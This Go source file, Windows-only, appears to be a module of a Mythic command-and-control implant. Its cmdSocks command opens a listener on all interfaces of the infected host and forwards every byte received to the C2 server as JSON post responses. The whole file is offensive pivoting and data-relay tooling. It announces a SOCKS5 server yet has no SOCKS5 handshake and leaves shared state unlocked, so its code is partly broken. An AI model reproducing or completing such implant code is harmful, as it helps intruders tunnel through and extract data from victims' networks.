//go:build windows
// +build windows

package main

import (
	"encoding/json"
	"fmt"
	"net"
	"sync"
)

type SocksServer struct {
	mu       sync.Mutex
	Port     int
	Running  bool
	StopChan chan struct{}
	Conns    map[uint32]net.Conn
	nextID   uint32
}

type SocksParams struct {
	Action string `json:"action"`
	Port   int    `json:"port"`
}

type SocksData struct {
	ID       uint32 `json:"server_id"`
	Data     string `json:"data"`
	Closed   bool   `json:"closed"`
}

func cmdSocks(raw json.RawMessage, a *Agent) string {
	var p SocksParams
	if err := json.Unmarshal(raw, &p); err != nil {
		return "error: " + err.Error()
	}

	switch p.Action {
	case "start":
		if a.Socks != nil && a.Socks.Running {
			return "SOCKS already running"
		}
		server := &SocksServer{
			Port:     p.Port,
			StopChan: make(chan struct{}),
			Conns:    make(map[uint32]net.Conn),
		}
		a.Socks = server
		go server.Start(a)
		return fmt.Sprintf("SOCKS5 started on port %d", p.Port)

	case "stop":
		if a.Socks == nil || !a.Socks.Running {
			return "SOCKS not running"
		}
		close(a.Socks.StopChan)
		for _, conn := range a.Socks.Conns {
			conn.Close()
		}
		a.Socks.Running = false
		a.Socks = nil
		return "SOCKS stopped"

	default:
		return fmt.Sprintf("unknown action: %s (use start/stop)", p.Action)
	}
}

func (s *SocksServer) Start(a *Agent) {
	s.Running = true

	listener, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", s.Port))
	if err != nil {
		return
	}
	defer listener.Close()

	go func() {
		<-s.StopChan
		listener.Close()
	}()

	for {
		conn, err := listener.Accept()
		if err != nil {
			break
		}

		id := s.nextID
		s.nextID++
		s.mu.Lock()
		s.Conns[id] = conn
		s.mu.Unlock()

		go s.handleConn(id, conn, a)
	}
}

func (s *SocksServer) handleConn(id uint32, conn net.Conn, a *Agent) {
	buf := make([]byte, 4096)
	for {
		n, err := conn.Read(buf)
		if err != nil {
			s.mu.Lock()
			delete(s.Conns, id)
			s.mu.Unlock()

			socksData := SocksData{ID: id, Closed: true}
			data, _ := json.Marshal(socksData)
			resp := MythicResponse{
				Action:     "post_response",
				UUID:       a.UUID,
				UserOutput: string(data),
				Completed:  true,
			}
			a.postResponse(resp)
			return
		}

		socksData := SocksData{
			ID:   id,
			Data: string(buf[:n]),
		}
		data, _ := json.Marshal(socksData)
		resp := MythicResponse{
			Action:     "post_response",
			UUID:       a.UUID,
			UserOutput: string(data),
			Completed:  true,
		}
		a.postResponse(resp)
	}
}
